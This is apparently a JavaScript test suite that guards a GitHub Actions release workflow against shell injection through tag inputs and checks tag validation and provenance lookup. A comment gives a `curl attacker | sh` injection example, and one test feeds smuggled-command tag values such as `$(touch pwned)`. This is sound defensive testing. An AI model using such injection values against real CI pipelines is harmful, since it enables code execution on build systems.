/**
 * Release integrity: the release workflow is driven by text a caller supplies
 * (a `workflow_dispatch` tag input, or a pushed ref name). That text must never
 * be spliced into a shell script, the tag must be a release tag rather than any
 * ref that happens to resolve, and `gh release create` must attach to that tag
 * instead of inventing one.
 */
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import yaml from 'js-yaml';
import { collectProvenance, evaluateProvenance } from '../scripts/release/verify-provenance.mjs';

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const workflowsDir = path.join(repoRoot, '.github', 'workflows');

function loadWorkflow(name) {
  return yaml.load(fs.readFileSync(path.join(workflowsDir, name), 'utf8'));
}

function releaseSteps() {
  return loadWorkflow('release.yml').jobs.release.steps;
}

function releaseRuns() {
  return releaseSteps().map((step) => step.run).filter(Boolean).join('\n');
}

test('no workflow splices an event or step expression into a shell script', () => {
  // `run:` text is a script the runner executes. An expression interpolated
  // there is expanded before bash parses it, so a value such as
  // `v1.2.3"; curl attacker | sh; "` becomes code. Values reach a script
  // through `env:` and shell quoting instead.
  const dangerous = /\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref_name|inputs\.|steps\.[^}]*\.outputs\.)/;
  for (const name of fs.readdirSync(workflowsDir)) {
    if (!/\.ya?ml$/.test(name)) continue;
    const workflow = loadWorkflow(name);
    for (const [jobName, job] of Object.entries(workflow.jobs)) {
      for (const step of job.steps || []) {
        if (!step.run) continue;
        assert.equal(dangerous.test(step.run), false, `${name}:${jobName} "${step.name}" interpolates an event or step output into its script`);
      }
    }
  }
  // The release workflow goes further: no expression at all in its scripts.
  for (const step of releaseSteps()) {
    if (!step.run) continue;
    assert.equal(step.run.includes('${{'), false, `release.yml "${step.name}" splices an expression into its script`);
  }
});

test('the release tag is validated before any step runs a command with it', () => {
  const resolve = releaseSteps().find((step) => step.id === 'tag');
  assert.ok(resolve, 'release.yml must keep the `id: tag` resolution step');
  assert.equal(resolve.env?.REQUESTED_TAG, '${{ github.event.inputs.tag || github.ref_name }}');
  assert.equal(resolve.run.includes('${{'), false);

  const scratch = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-tag-validation-'));
  const run = (tag) => {
    const output = path.join(scratch, 'github-output');
    fs.writeFileSync(output, '');
    try {
      execFileSync('bash', ['-c', resolve.run], {
        cwd: scratch,
        env: { ...process.env, REQUESTED_TAG: tag, GITHUB_OUTPUT: output },
        stdio: 'pipe',
      });
      return { ok: true, output: fs.readFileSync(output, 'utf8') };
    } catch (error) {
      return { ok: false, output: fs.readFileSync(output, 'utf8'), stderr: String(error.stderr) };
    } finally {
      fs.rmSync(output, { force: true });
    }
  };
  try {
    // Accepted: a release tag, with or without a prerelease component.
    assert.deepEqual(run('v0.2.0-rc.14'), { ok: true, output: 'tag=v0.2.0-rc.14\n' });
    assert.equal(run('v1.0.0').ok, true);

    // Rejected: anything that is not vMAJOR.MINOR.PATCH(-prerelease), including
    // a branch name and shell syntax.
    for (const tag of ['main', 'release-1', 'v1.2', 'v1.2.3.4', 'v1.2.3-', '1.2.3', 'v1.2.3 extra',
      'v1.2.3$(touch pwned)', 'v1.2.3"; touch pwned; echo "', 'v1.2.3`touch pwned`', 'v1.2.3\nv2.0.0']) {
      const result = run(tag);
      assert.equal(result.ok, false, `tag ${JSON.stringify(tag)} must be rejected`);
      assert.equal(result.output, '', `a rejected tag ${JSON.stringify(tag)} must not reach GITHUB_OUTPUT`);
      assert.equal(fs.existsSync(path.join(scratch, 'pwned')), false, `tag ${JSON.stringify(tag)} executed shell syntax`);
    }
  } finally {
    fs.rmSync(scratch, { recursive: true, force: true });
  }
});

test('gh release create attaches to the verified tag instead of creating one', () => {
  const runs = releaseRuns();
  const create = runs.split('\n').filter((line) => line.includes('gh release create'));
  assert.ok(create.length > 0, 'the release workflow must create a draft release');
  for (const line of create) {
    assert.match(line, /--draft/, 'the release is always created as a draft');
    // Without --verify-tag, gh creates a missing tag from the default branch,
    // so the release would no longer point at the commit provenance verified.
    assert.match(line, /--verify-tag/, `gh release create must verify the tag exists: ${line.trim()}`);
  }
});

test('the tag reaches every later step through the environment, not the script text', () => {
  const steps = releaseSteps().filter((step) => String(step.run || '').includes('RELEASE_TAG'));
  assert.ok(steps.length >= 3, 'the provenance, create/attach and post-upload steps all use the tag');
  for (const step of steps) {
    assert.equal(String(step.run).includes('steps.tag.outputs.tag'), false, `"${step.name}" splices the tag into its script`);
  }
  const provenance = releaseSteps().find((step) => String(step.run).includes('node scripts/release/verify-provenance.mjs'));
  assert.equal(provenance.env.RELEASE_TAG, '${{ steps.tag.outputs.tag }}');
  assert.match(provenance.run, /--tag "\$RELEASE_TAG"/);
});

test('provenance resolves a release tag only through refs/tags/<tag>', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-tag-ref-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  const git = (...args) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim();
  git('init', '-q');
  git('config', 'user.name', 'Fixture');
  git('config', 'user.email', 'fixture@example.invalid');
  fs.writeFileSync(path.join(cwd, 'package.json'), '{"name":"tag-ref-fixture"}');
  git('add', '.');
  git('commit', '-qm', 'fixture');
  const head = git('rev-parse', 'HEAD');
  // A branch named like a release tag: `git rev-parse v9.9.9` resolves it, but
  // a release tag must come from refs/tags only.
  git('branch', 'v9.9.9');
  git('branch', 'main');

  // `collectProvenance` reads the pin from this repository, so the git helper is
  // wrapped to keep the fixture's missing source commit out of the report.
  const gitRun = (args, runCwd) => execFileSync('git', args, {
    cwd: runCwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'],
  }).trim();

  let collected = collectProvenance({ tag: 'v9.9.9', cwd, gitRun });
  assert.equal(collected.head, head);
  assert.equal(collected.tagCommit, null, 'a branch must not satisfy a release tag lookup');

  const { problems } = evaluateProvenance({
    tag: 'v9.9.9',
    head,
    tagCommit: collected.tagCommit,
    sourceCommit: null,
    packageVersion: '9.9.9',
    pinVersion: '9.9.9',
    treeDigest: 'a'.repeat(64),
    pinContentSha256: 'a'.repeat(64),
    isAncestor: () => false,
  });
  assert.ok(problems.some((problem) => problem.includes('does not resolve to refs/tags/v9.9.9')), problems.join('\n'));

  assert.equal(collectProvenance({ tag: 'main', cwd, gitRun }).tagCommit, null, 'a plain branch must not resolve');

  // A real tag on the same commit is accepted, so the strict lookup is not a
  // blanket failure.
  git('tag', 'v9.9.9');
  collected = collectProvenance({ tag: 'v9.9.9', cwd, gitRun });
  assert.equal(collected.tagCommit, head);
});
